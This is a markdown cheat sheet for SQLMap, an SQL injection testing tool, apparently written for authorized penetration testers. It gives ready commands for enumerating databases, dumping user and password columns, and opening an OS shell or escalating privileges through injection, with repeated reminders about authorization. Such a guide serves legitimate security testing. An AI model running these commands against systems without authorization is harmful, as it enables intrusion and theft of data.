# SQLMap

SQLMap is an automated SQL injection testing tool that can detect SQL injection vulnerabilities, fingerprint database management systems, enumerate databases and tables, and extract data from vulnerable applications.

> Use SQLMap only against systems you are authorized to test.

## Installation

SQLMap is included with Kali Linux.

```bash
sqlmap --version
```

On Debian-based systems:

```bash
sudo apt update
sudo apt install sqlmap
```

Official Kali reference:

https://tools.kali.org/vulnerability-analysis/sqlmap

## Quick Start

Test a URL:

```bash
sqlmap -u "https://target.example/item?id=1"
```

Test a Burp request:

```bash
sqlmap -r request.txt
```

List databases:

```bash
sqlmap -r request.txt --dbs
```

Select a database:

```bash
sqlmap -r request.txt -D database_name --tables
```

List columns:

```bash
sqlmap -r request.txt -D database_name -T users --columns
```

Dump selected data:

```bash
sqlmap -r request.txt -D database_name -T users -C username,password --dump
```

## 1. Using a Burp Request

Intercept the request in Burp Suite and save the complete HTTP request.

```bash
touch request.txt
nano request.txt
```

Paste the request into `request.txt`, then run:

```bash
sqlmap -r request.txt
```

A request should look similar to:

```http
POST /login HTTP/1.1
Host: target.example
Content-Type: application/x-www-form-urlencoded
Cookie: session=example

username=test&password=test
```

Keep the request structure intact. Avoid manually changing headers unless you understand why the change is needed.

You can also use Burp Suite to send the request to Repeater first and confirm that the request works normally.

## 2. Basic URL Testing

```bash
sqlmap -u "https://target.example/item?id=1"
```

With a cookie:

```bash
sqlmap -u "https://target.example/item?id=1" \
  --cookie="session=YOUR_SESSION"
```

Follow redirects:

```bash
sqlmap -u "https://target.example/item?id=1" --follow-redirects
```

Use a custom User-Agent:

```bash
sqlmap -u "https://target.example/item?id=1" \
  --user-agent="Mozilla/5.0"
```

## 3. POST Data

You can provide POST parameters directly:

```bash
sqlmap -u "https://target.example/login" \
  --data="username=test&password=test"
```

For JSON requests, preserve the application's original request format:

```bash
sqlmap -u "https://target.example/api/login" \
  --data='{"username":"test","password":"test"}' \
  --headers="Content-Type: application/json"
```

For complex authenticated requests, using `-r request.txt` is usually cleaner.

## 4. Testing a Specific Parameter

If you already know the injection point, use `-p`.

Example:

```bash
export URL="https://target.example/item?p1=DATA&p2=DATA&p3=DATA&p4=INJECTABLE"

sqlmap -u "$URL" -p p4
```

Multiple parameters:

```bash
sqlmap -u "$URL" -p "p3,p4"
```

This can reduce unnecessary testing when the injection point is already known.

## 5. Database Management System

If the DBMS is already known, specify it to reduce fingerprinting work.

```bash
--dbms=mysql
```

Common values include:

```bash
--dbms=mysql
--dbms=mssql
--dbms=postgresql
--dbms=oracle
```

Example:

```bash
sqlmap -r request.txt --dbms=mysql
```

Only specify the DBMS when you have a reasonable basis for doing so.

## 6. Threads, Level, Risk and Timing

### Threads

Control the number of concurrent requests:

```bash
--threads=2
```

Example:

```bash
sqlmap -r request.txt --threads=2
```

More threads can increase speed but may also increase load and trigger defenses.

### Level

Controls the amount of testing SQLMap performs.

```bash
--level=1
```

Maximum:

```bash
--level=5
```

A practical progression is:

```bash
--level=1
--level=2
--level=3
```

Increase it only when necessary.

### Risk

Controls potentially more intrusive tests.

```bash
--risk=1
```

Maximum:

```bash
--risk=3
```

Start with the default and increase it only when appropriate for the authorized target.

### Time-based SQLi

Increase the delay used for time-based detection:

```bash
--time-sec=10
```

Example:

```bash
sqlmap -r request.txt --technique=T --time-sec=10
```

Do not use unnecessarily large delays because they can generate slow and noisy requests.

## 7. SQL Injection Techniques

SQLMap supports several SQL injection techniques.

Common technique identifiers:

```text
B   Boolean-based blind
E   Error-based
U   UNION query-based
S   Stacked queries
T   Time-based blind
Q   Inline queries
```

Test only time-based:

```bash
sqlmap -r request.txt --technique=T
```

Test Boolean-based:

```bash
sqlmap -r request.txt --technique=B
```

Combine techniques:

```bash
sqlmap -r request.txt --technique=BEUT
```

Allow SQLMap to choose automatically when you do not have a reason to restrict the technique.

## 8. SSL / HTTPS

For HTTPS targets:

```bash
sqlmap -u "https://target.example/item?id=1"
```

If the target or connection specifically requires SQLMap's SSL option:

```bash
--force-ssl
```

Example:

```bash
sqlmap -r request.txt --force-ssl
```

Do not confuse application HTTPS with the database's own SSL configuration.

## 9. Database Enumeration

### Identify the DBMS

```bash
sqlmap -r request.txt
```

### List databases

```bash
sqlmap -r request.txt --dbs
```

### Select a database

```bash
sqlmap -r request.txt -D database_name
```

### List tables

```bash
sqlmap -r request.txt -D database_name --tables
```

### List columns

```bash
sqlmap -r request.txt -D database_name -T users --columns
```

### Dump a table

```bash
sqlmap -r request.txt -D database_name -T users --dump
```

### Dump selected columns

```bash
sqlmap -r request.txt \
  -D database_name \
  -T users \
  -C username,email \
  --dump
```

### Dump specific rows

```bash
sqlmap -r request.txt \
  -D database_name \
  -T users \
  --start=1 \
  --stop=10 \
  --dump
```

## 12. OS Interaction

SQLMap may provide operating-system interaction when the underlying DBMS, privileges, configuration, and SQL injection technique allow it.

Check whether OS command execution is available:

```bash
sqlmap -r request.txt --os-shell
```

`--os-shell` can provide an interactive operating-system shell when supported.

Other OS-related options include:

```bash
--os-cmd="whoami"
```

and:

```bash
--priv-esc
```

These options should only be used when explicitly authorized because they can move beyond database enumeration into host-level interaction.

## 13. SQLMap With Environment Variables

Set a target:

```bash
export URL="https://target.example/item?id=1"
```

Run SQLMap:

```bash
sqlmap -u "$URL"
```

Time-based testing:

```bash
sqlmap -u "$URL" \
  --threads=2 \
  --time-sec=10 \
  --level=2 \
  --risk=2 \
  --technique=T
```

Boolean-based testing:

```bash
sqlmap -u "$URL" \
  --threads=2 \
  --level=2 \
  --risk=2 \
  --technique=B
```

Specific parameter:

```bash
sqlmap -u "$URL" -p id
```

## 14. Authentication

### Cookie

```bash
sqlmap -u "https://target.example/item?id=1" \
  --cookie="session=YOUR_SESSION"
```

### HTTP Header

```bash
sqlmap -u "https://target.example/item?id=1" \
  --headers="Authorization: Bearer YOUR_TOKEN"
```

For multiple or complex headers, prefer a captured request:

```bash
sqlmap -r request.txt
```

## 15. Proxy Through Burp

Send SQLMap traffic through Burp Suite:

```bash
sqlmap -r request.txt \
  --proxy="http://127.0.0.1:8080"
```

This is useful for inspecting requests and responses during testing.

## 16. Verbose Output

Increase output detail:

```bash
-v 1
```

More detailed:

```bash
-v 3
```

Maximum verbosity:

```bash
-v 6
```

A practical debugging level:

```bash
-v 3
```

## 17. Saving and Reusing Sessions

SQLMap stores session information for previously tested targets.

List the current output directory:

```bash
ls ~/.local/share/sqlmap/output/
```

You can also specify an output directory:

```bash
--output-dir=/tmp/sqlmap
```

This can be useful when testing several authorized targets and keeping results organized.

## 19. Practical Workflow

A clean SQLMap workflow:

```text
1. Confirm authorization and scope
2. Capture the request in Burp
3. Reproduce the request manually
4. Save the request as request.txt
5. Run basic SQLMap detection
6. Identify the DBMS
7. Identify the injectable parameter
8. Enumerate databases
9. Enumerate tables
10. Enumerate columns
11. Extract only required test data
12. Validate the vulnerability manually
13. Document the request, parameter, impact, and evidence
```

Start simple:

```bash
sqlmap -r request.txt
```

If the injection point is known:

```bash
sqlmap -r request.txt -p id
```

If the DBMS is known:

```bash
sqlmap -r request.txt -p id --dbms=mysql
```

Enumerate:

```bash
sqlmap -r request.txt -p id --dbs
```

Then:

```bash
sqlmap -r request.txt -p id -D database_name --tables
```

Then:

```bash
sqlmap -r request.txt -p id \
  -D database_name \
  -T users \
  --columns
```

Finally, dump only the necessary columns:

```bash
sqlmap -r request.txt -p id \
  -D database_name \
  -T users \
  -C username,email \
  --dump
```

## 21. Common Mistakes

### Starting with aggressive options

Avoid immediately using:

```bash
--level=5 --risk=3
```

Start with the defaults and increase them when needed.

### Testing every parameter unnecessarily

If the vulnerable parameter is known:

```bash
-p parameter
```

### Using the wrong DBMS

Do not blindly specify:

```bash
--dbms=mysql
```

unless the DBMS is known or strongly suspected.

### Ignoring authentication

Authenticated applications often require session cookies or authorization headers.

Using the captured request is usually easier:

```bash
sqlmap -r request.txt
```

### Forgetting application behavior

SQLMap is an automation tool. Always verify interesting findings manually and understand the application's request and response behavior.
